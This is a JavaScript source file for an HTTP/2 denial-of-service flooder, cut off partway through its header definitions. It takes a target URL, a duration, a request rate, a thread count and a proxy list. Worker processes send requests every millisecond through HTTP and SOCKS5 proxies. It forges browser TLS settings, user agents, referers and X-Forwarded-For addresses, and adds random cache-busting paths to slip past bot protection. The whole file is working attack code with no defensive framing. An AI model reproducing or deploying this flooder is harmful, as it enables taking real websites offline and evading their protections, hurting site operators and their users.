const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`.`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        //console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            //console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
    chrome: { min: 115, max: 130 },
    safari: { min: 14, max: 17 },
    brave: { min: 115, max: 130 },
    firefox: { min: 99, max: 115 },
    mobile: { min: 85, max: 115 },
    opera: { min: 70, max: 95 },
    operagx: { min: 70, max: 95 },
    duckduckgo: { min: 12, max: 18 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
    brave: `${Math.floor(90 + Math.random() * 10)}.${Math.floor(4000 + Math.random() * 500)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 500)}`,
    chrome: `${Math.floor(90 + Math.random() * 10)}.${Math.floor(4000 + Math.random() * 500)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 500)}`,
    firefox: `${Math.floor(85 + Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 500)}`,
    safari: `${Math.floor(13 + Math.random() * 3)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 500)}`,
    mobile: `${Math.floor(90 + Math.random() * 10)}.${Math.floor(4000 + Math.random() * 500)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 500)}`,
    opera: `${Math.floor(90 + Math.random() * 10)}.${Math.floor(4000 + Math.random() * 500)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 500)}`,
    operagx: `${Math.floor(90 + Math.random() * 10)}.${Math.floor(4000 + Math.random() * 500)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 500)}`,
    duckduckgo: `${Math.floor(6 + Math.random() * 2)}.${Math.floor(Math.random() * 10)}`
};

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
    chrome: Math.random() < 0.5 ? "Win64" : "MacIntel",
    safari: Math.random() < 0.5 ? "macOS" : "iOS",
    brave: Math.random() < 0.5 ? "Linux" : "Windows",
    firefox: Math.random() < 0.5 ? "Linux" : "MacIntel",
    mobile: Math.random() < 0.5 ? "Android" : "iOS",
    opera: Math.random() < 0.5 ? "Linux" : "Windows",
    operagx: Math.random() < 0.5 ? "Linux" : "Windows",
    duckduckgo: Math.random() < 0.5 ? "macOS" : "Windows"
};
    const platform = platforms[browser];

    const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} Safari/537.36`,
    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(90 + Math.random() * 25)}.0) Gecko/20100101 Firefox/${Math.floor(90 + Math.random() * 25)}.0`,
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(10 + Math.random() * 5)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${Math.floor(11 + Math.random() * 5)}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} Safari/537.36 OPR/${Math.floor(70 + Math.random() * 30)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`,
    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} Safari/537.36 OPR/${Math.floor(70 + Math.random() * 30)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} (Edition GX)`,
    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(Math.random() * 500)}`,
    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(8 + Math.random() * 7)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)} Mobile Safari/537.36`,
    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(10 + Math.random() * 5)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${Math.floor(11 + Math.random() * 5)}.0 DuckDuckGo/7 Safari/605.1.${Math.floor(Math.random() * 20)}`
};
    const secFetchUser = Math.random() < 0.65 ? "?1;?1" : Math.random() < 0.8 ? "?1" : "?0";
const secChUaMobile = browser === "mobile" ? "?1" : Math.random() < 0.1 ? "?1" : "?0";

const acceptEncoding = Math.random() < 0.25
  ? "gzip, deflate, br, zstd, lz4"
  : Math.random() < 0.4
  ? "gzip, deflate, br, zstd, bzip2"
  : Math.random() < 0.6
  ? "gzip, deflate, br, zstd"
  : "gzip, deflate, br";

const accept = Math.random() < 0.6 
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  : Math.random() < 0.8
  ? "application/json, text/javascript, */*;q=0.01"
  : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";

const secChUaPlatform = ["Windows", "Linux", "macOS", "Android", "iOS"][Math.floor(Math.random() * 5)];
const secChUaFull = Math.random() < 0.6 
  ? `"Google Chrome";v="${Math.floor(115 + Math.random() * 15)}", "Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Not-A.Brand";v="99"`
  : Math.random() < 0.8
  ? `"Microsoft Edge";v="${Math.floor(115 + Math.random() * 15)}", "Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Not-A.Brand";v="99"`
  : `"Mozilla Firefox";v="${Math.floor(115 + Math.random() * 10)}"`;

const secFetchDest = ["document", "image", "empty", "frame", "script", "style", "font", "video", "audio"][Math.floor(Math.random() * 9)];
const secFetchMode = ["navigate", "cors", "no-cors", "same-origin", "same-site"][Math.floor(Math.random() * 5)];
const secFetchSite = ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)];

const acceptLanguage = [
  "en-US,en;q=0.9", "en-GB,en;q=0.9", "es-ES,es;q=0.8,en;q=0.7", 
  "fr-FR,fr;q=0.8", "id-ID,id;q=0.9", "de-DE,de;q=0.8", 
  "ja-JP,ja;q=0.8", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.8",
  "pt-BR,pt;q=0.8", "it-IT,it;q=0.8", "ko-KR,ko;q=0.8"
][Math.floor(Math.random() * 12)];

const acceptCharset = Math.random() < 0.7 ? "UTF-8" : "ISO-8859-1";
const connection = "keep-alive";
const xRequestedWith = Math.random() < 0.55 ? "XMLHttpRequest" : "Fetch";

const referer = [
  "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", 
  "https://www.reddit.com/", "https://twitter.com/", "https://www.twitch.tv/",
  "https://www.youtube.com/", "https://discord.com/", "https://www.linkedin.com/",
  "https://www.nvidia.com/", "https://www.amazon.com/", "https://www.netflix.com/",
  "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/",
  "https://www.github.com/", "https://www.stackoverflow.com/",
  "https://www.microsoft.com/", "https://www.apple.com/", "https://www.spotify.com/"
][Math.floor(Math.random() * 20)];

const origin = [
  "https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", 
  "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
  "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
  "https://news.ycombinator.com", "https://www.github.com",
  "https://www.microsoft.com", "https://www.apple.com"
][Math.floor(Math.random() * 13)];

function brutalString(minLength = 6, maxLength = 12) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_~!@$%^&*";
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let str = "";
    for (let i = 0; i < length; i++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return str;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "FR", ip: "13.37.0." },
        { asn: "AS4766", country: "KR", ip: "1.201.0." },
        { asn: "AS4134", country: "CN", ip: "101.226.0." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

const xForwardedFor = generateLegitIP() + (Math.random() < 0.3 ? `, ${generateLegitIP()}` : '');
const xRealIP = generateLegitIP();
const xClientIP = generateLegitIP();
const forwarded = `for=${generateLegitIP()};proto=https` + (Math.random() < 0.2 ? `;host=${parsedTarget.host}` : '');

const te = Math.random() < 0.6 ? "trailers" : "gzip";
const cacheControl = Math.random() < 0.55 ? "no-cache" : Math.random() < 0.8 ? "max-age=3600" : "no-store";

function getRandomPath() {
    const paths = [
        "/about", "/products", "/contact", "/news", "/services",
        "/blog/post-" + Math.floor(Math.random() * 5000), 
        "/article/" + Math.floor(Math.random() * 3000),
        "/category/" + Math.floor(Math.random() * 200),
        "/shop/product-" + Math.floor(Math.random() * 2000),
        "/portfolio", "/faq", "/support",
        "/store/item-" + Math.floor(Math.random() * 3000),
        "/events/" + Math.floor(Math.random() * 1000),
        "/search?q=" + generateRandomString(12),
        "/user/profile/" + generateRandomString(10),
        "/comments/" + Math.floor(Math.random() * 10000),
        "/forum/topic-" + Math.floor(Math.random() * 5000),
        "/checkout/cart-" + Math.floor(Math.random() * 1000),
        "/dashboard", "/settings", "/notifications",
        "/posts/latest", "/api/data", "/static/images/" + generateRandomString(16) + ".png",
        "/download/" + generateRandomString(8), "/video/" + Math.floor(Math.random() * 5000),
        "/api/v" + Math.floor(Math.random() * 3) + "/" + generateRandomString(6)
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}
    const headersMap = {
    brave: {
        ":method": "GET",
        ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

        "sec-ch-ua": `"Brave";v="${Math.floor(123 + Math.random() * 2)}", "Chromium";v="${Math.floor(123 + Math.random() * 2)}", "Not A;Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
        "sec-ch-ua-platform": `"Windows"`,
        "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0.0"` : `"11.0.0"`,
        "sec-ch-ua-full-version-list": `"Brave";v="${Math.floor(123 + Math.random() * 2)}.0.0.0", "Chromium";v="${Math.floor(123 + Math.random() * 2)}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
        "sec-ch-ua-bitness": `"64"`,
        "sec-ch-ua-model": `""`,
        "sec-ch-ua-arch": `"x86"`,

        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(123 + Math.random() * 2)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(123 + Math.random() * 2)}.0.0.0`,

        "accept": Math.random() < 0.5 
            ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5"
            : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

        "accept-language": [
            "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
            "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
        ][Math.floor(Math.random() * 6)],

        "accept-encoding": [
            "gzip, deflate, br", 
            "gzip, deflate, zstd, br", 
            "gzip, br, zstd", 
            "br, gzip"
        ][Math.floor(Math.random() * 4)],

        "referer": [
            "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/",
            "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
            "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/",
            "https://www.reddit.com/", "https://www.facebook.com/", "https://www.linkedin.com/",
            "https://www.amazon.com/", "https://www.netflix.com/", "https://www.nvidia.com/",
            "https://www.paypal.com/", "https://news.ycombinator.com/", "https://www.bbc.com/"
        ][Math.floor(Math.random() * 18)],

        "origin": [
            "https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", 
            "https://www.twitch.tv", "https://www.google.com", "https://www.reddit.com",
            "https://www.amazon.com", "https://www.nvidia.com", "https://www.netflix.com",
            "https://news.ycombinator.com"
        ][Math.floor(Math.random() * 10)],

        "x-forwarded-for": generateLegitIP(),
        "x-real-ip": generateLegitIP(),
        "x-client-ip": generateLegitIP(),
        "forwarded": `for=${generateLegitIP()};proto=https`,

        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": Math.random() < 0.6 ? "same-origin" : "cross-site",

        "cache-control": Math.random() < 0.5 
            ? "max-age=0" 
            : "no-cache, no-store, must-revalidate",

        "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
        "dnt": Math.random() < 0.5 ? "1" : "0",
        "te": "trailers",
        "early-data": "1",
        "priority": `"u=0, i"`,
        "ect": ["2g", "3g", "4g", "5g"][Math.floor(Math.random() * 4)],
        "rtt": Math.floor(Math.random() * 500) + 50,
        "downlink": (Math.random() * 10).toFixed(2)
    },
    chrome: {
    ":method": "GET",
    ":authority": Math.random() < 0.65 
    ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
    : (Math.random() < 0.4 
        ? "www." 
        : Math.random() < 0.3 
            ? "cdn." 
            : Math.random() < 0.2 
                ? "img." 
                : Math.random() < 0.1 
                    ? "files." 
                    : "static."
      ) + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
":scheme": "https",
":path": parsedTarget.path + "?" 
    + brutalString(4, 10) + "=" + brutalString(15, 25) + "&" 
    + brutalString(4, 10) + "=" + brutalString(12, 22) + "&" 
    + brutalString(3, 8) + "=" + brutalString(8, 18) + "&cb=" + Date.now(),

    "sec-ch-ua": `"Google Chrome";v="${Math.floor(123 + Math.random() * 2)}", "Chromium";v="${Math.floor(123 + Math.random() * 2)}", "Not.A/Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.3 ? "?1" : "?0",
    "sec-ch-ua-platform": `"Windows"`,
    "sec-ch-ua-platform-version": Math.random() < 0.6 ? `"10.0.0"` : `"11.0.0"`,
    "sec-ch-ua-full-version-list": `"Google Chrome";v="${Math.floor(123 + Math.random() * 2)}.0.${Math.floor(Math.random() * 5000)}.0", "Chromium";v="${Math.floor(123 + Math.random() * 2)}.0.${Math.floor(Math.random() * 5000)}.0", "Not.A/Brand";v="99.0.0.0"`,
    "sec-ch-ua-bitness": `"64"`,
    "sec-ch-ua-model": `""`,
    "sec-ch-ua-arch": `"x86"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.6 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(123 + Math.random() * 2)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,

    "accept": Math.random() < 0.6 
        ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        : "application/json,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    "accept-language": [
        "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
        "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
    ][Math.floor(Math.random() * 6)],

    "accept-encoding": [
        "gzip, deflate, br", "gzip, deflate, zstd, br", 
        "gzip, br, deflate", "br, gzip, zstd"
    ][Math.floor(Math.random() * 4)],

    "referer": [
